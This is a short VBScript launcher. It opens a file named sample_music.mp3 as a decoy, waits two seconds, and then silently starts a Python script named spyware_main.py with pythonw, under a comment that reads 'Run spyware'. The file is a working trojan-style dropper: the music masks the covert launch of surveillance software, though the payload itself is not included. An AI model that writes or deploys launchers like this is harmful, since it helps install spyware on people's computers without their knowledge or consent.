Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get the folder where this script is located
ScriptFolder = FSO.GetParentFolderName(WScript.ScriptFullName)

' Play the MP3 file
MP3File = ScriptFolder & "\sample_music.mp3"
WshShell.Run """" & MP3File & """", 0, False

' Wait 2 seconds
WScript.Sleep 2000

' Run spyware
SpywareFile = ScriptFolder & "\..\spyware_main.py"
WshShell.Run "pythonw """ & SpywareFile & """", 0, False
